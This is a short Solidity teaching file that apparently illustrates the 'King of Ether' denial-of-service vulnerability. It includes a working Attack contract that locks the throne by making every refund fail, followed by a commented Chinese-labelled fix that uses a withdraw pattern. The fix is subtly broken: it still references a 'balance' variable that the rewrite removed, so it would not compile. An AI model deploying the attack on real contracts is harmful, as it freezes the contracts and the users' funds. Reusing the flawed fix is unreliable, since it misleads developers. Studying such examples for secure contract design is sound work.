// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingOfEther {
    address public king;
    uint public balance;
    

    function claimThrone() external payable {
        require(msg.value > balance, "Need to pay more to become the king");

       
        (bool sent, ) = king.call{value: balance}("");
        require(sent, "Failed to send Ether");
        balance = msg.value;
        king = msg.sender;
    }
}


contract Attack {
    KingOfEther kingOfEther;

    constructor(KingOfEther _kingOfEther) {
        kingOfEther = KingOfEther(_kingOfEther);
    }
    function attack() public payable {
        kingOfEther.claimThrone{value: msg.value}();
    }
}

//修复建议
/*

pragma solidity ^0.8.0;

contract KingOfEther {
    address public king;
    uint public KingValue;
    mapping(address => uint) public balances;

    function claimThrone() external payable {
        balances[msg.sender] += msg.value;

        require(balances[msg.sender] > balance, "Need to pay more to become the king");
        
        KingValue = balances[msg.sender];
        king = msg.sender;
    }

    function withdraw() public {
        require(msg.sender != king, "Current king cannot withdraw");

        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}
*/